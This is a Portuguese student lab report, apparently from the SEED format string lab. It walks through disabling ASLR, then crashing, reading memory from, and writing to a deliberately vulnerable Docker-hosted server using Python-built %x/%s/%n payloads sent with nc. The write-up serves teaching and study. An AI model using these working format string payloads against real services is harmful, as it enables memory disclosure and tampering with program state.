# Format String Attack

## Setup 

- Primeiramente desativamos as contramedidas existentes que dificultariam o nosso ataque.

```bash
$ sudo sysctl -w kernel.randomize_va_space=0
```

- Usámos o Docker Compose para construir e iniciar os containers.

```bash
$ dcbuild   # Alias para 'docker-compose build'
$ dcup      # Alias para 'docker-compose up'
```

- Num terminal diferente, após obtermos o `ID` do container desejado, acedemos a sua shell.

```bash
$ docksh 49  # Alias para 'docker exec -it <id> /bin/bash'
root@4929549778e2:/fmt#
```

## Task 1

- Mandamos a nossa primeira mensagem benigna para o servidor

```bash
$ echo 'hello' | nc 10.9.0.5 9090
^C
```

- O servidor retornou endereços importantes e termina com uma mensagem `Returned properly` visto que a nossa mensagem foi recebida com sucesso.

- Com a informação de que o servidor aceita apenas até 1500 bytes, atualizamos o ficheiro `build_string.py` para explorar essa vulnerabilidade.

```py
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*25 + "%n" # alteração do número de "%.8x"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

```bash
$ python3 build_string.py
$ cat badfile | nc 10.9.0.5 9090
```

- O servidor desta vez não apresentou a mensagem `Returned properly` o que demonstra que o servidor crashou.

## Task 2

### Task 2.A

- Escolhemos o valor `0xdeadbeef` para meter no início do nosso input, sendo assim fácil de identificá-lo caso o servidor o imprimisse.

- Após algumas tentativas, chegámos à conclusão de que foram necessários 64 especificadores de formato `%x` para acessar a localização da stack onde o valor estava alocado.

```py
number = 0xdeadbeef
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.8x"*64
```

![image](screenshots/LB6_1.png)

### Task 2.B

- Identificamoso endereço da "secret message": `0x080b4008`

- Modificamos o nosso payload de modo a poder ler a mensagem secreta.

```py
number = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.8x"*63 + "%s"
```
- A string formada pela expressão: `s = "%.8x"*63 + "%s"` salta 63 casas da stack e de seguida usa `%s` para interpretar o endereço da mensagem como um pointer para a string.

![image](screenshots/LB6_2.png)

## Task 3

### Task 3.A

- Temos a informação do endereço da "target variable": `0x080e5068`

- O seu conteúdo é `0x11223344` e temos como objetivo mudar para outro valor. A tática é então muito semelhante à anterior, com a diferença de que desta vez escrevemos no endereço.

```py
number = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.8x"*63 + "%n"
```

![image](screenshots/LB6_3.png)

### Task 3.B

- Para mudarmos o valor do endereço `target` para `0x5000` é necessário um maior controle de caracteres impressos antes do especificador `%n`.

- Convertendo `0x5000` para decimal obtemos o valor `20480`. Isto indica que é necessário imprimirmos essa quantidade de caracteres antes de usarmos `%n`.

```py
s = "%19976x" + "%.8x" * 62 + "%n"
```

![image](screenshots/LB6_4.png)


